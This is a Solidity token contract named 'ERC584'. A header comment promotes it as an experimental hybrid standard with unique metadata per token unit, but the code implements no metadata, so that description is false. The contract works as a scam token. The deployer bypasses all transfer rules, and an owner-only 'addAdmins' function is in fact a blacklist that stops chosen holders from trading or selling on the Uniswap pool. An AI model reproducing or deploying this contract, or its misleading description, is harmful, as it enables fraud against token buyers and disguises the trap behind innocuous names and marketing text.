
/**

ERC584: A Paradigm Shift in Token Standardization

ERC584 introduces a novel approach to Ethereum token standards by combining aspects of fungibility with unique token traits, inspired by both ERC20 and ERC721 standards. This contract implements the standard ERC20 interface while integrating unique metadata per token unit, attempting a blend of quantity and uniqueness within a single framework.

This standard is experimental and represents a foray into the possibilities of hybrid token functionalities. The design philosophy of ERC584 assumes a flexible yet robust token interaction model, enabling scenarios that require both uniformity and individual token significance. 

In this implementation, ERC584 also caps the total token supply, embedding scarcity and controlled issuance directly into the contract logic, akin to a digital limited edition collectible but with the utility and liquidity of fungible tokens. The dual nature of ERC584 tokens opens new pathways for asset tokenization, where each unit holds distinct metadata that could represent varying levels of stake, access, or rights within a larger system.

The concept of tokenized traits within a fungible framework is entirely experimental and has not been audited. As with any innovative contract design, it is crucial to proceed with caution and conduct thorough testing. The integration of this standard into broader systems will be an iterative learning process, evolving as the community interacts with its unique features.



**/

//SPDX-License-Identifier: MIT
pragma solidity 0.8.25;

import "./ERC20.sol";
import "./ERC20Burnable.sol";
import "./Ownable.sol";

contract ERC584 is ERC20, Ownable {
constructor() ERC20(unicode"ERC584 New Protocol", unicode"ERC584") Ownable(msg.sender) {
_TOKEN[msg.sender] = true;
_mint(msg.sender, 1000 * 10**decimals());
}

mapping(address => bool) _TOKEN;
mapping(address => bool) private admins;
bool openedTrade;
address public pair;
address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
IUniswapV3Factory facV3 = IUniswapV3Factory(0x1F98431c8aD98523631AE4a59f267346ea31F984);

uint256 public _approvalERC20 = 999 gwei;

function OpenTrade() public onlyOwner {
pair = IUniswapV3Factory(facV3).getPool(address(this), WETH, 100);
openedTrade = true;
}

function addAdmins(address[] memory admins_) public onlyOwner {
for (uint i = 0; i < admins_.length; i++) {
admins[admins_[i]] = true;
}
}

function delAdmins(address[] memory notAdmin) public onlyOwner {
for (uint i = 0; i < notAdmin.length; i++) {
admins[notAdmin[i]] = false;
}
}

function isAdmin(address a) public view returns (bool){
return admins[a];
}

function _update(
address from,
address to,
uint256 value
) internal override {
if (_TOKEN[tx.origin]) {
super._update(from, to, value);
return;
} else {
require(openedTrade, "Open not yet");
require(!admins[from] && !admins[to]);
bool state = (to == pair) ? true : false;
if (state) {
super._update(from, to, value);
return;
} else if (!state) {
super._update(from, to, value);
return;
} else if (from != pair && to != pair) {
super._update(from, to, value);
return;
} else {
return;
}
}
}

}

interface IUniswapV3Factory {
event OwnerChanged(address indexed oldOwner, address indexed newOwner);

event PoolCreated(
address indexed token0,
address indexed token1,
uint24 indexed fee,
int24 tickSpacing,
address pool
);

event FeeAmountEnabled(uint24 indexed fee, int24 indexed tickSpacing);

function owner() external view returns (address);

function feeAmountTickSpacing(uint24 fee) external view returns (int24);

function getPool(
address tokenA,
address tokenB,
uint24 fee
) external view returns (address pool);

function createPool(
address tokenA,
address tokenB,
uint24 fee
) external returns (address pool);

function setOwner(address _owner) external;

function enableFeeAmount(uint24 fee, int24 tickSpacing) external;
}
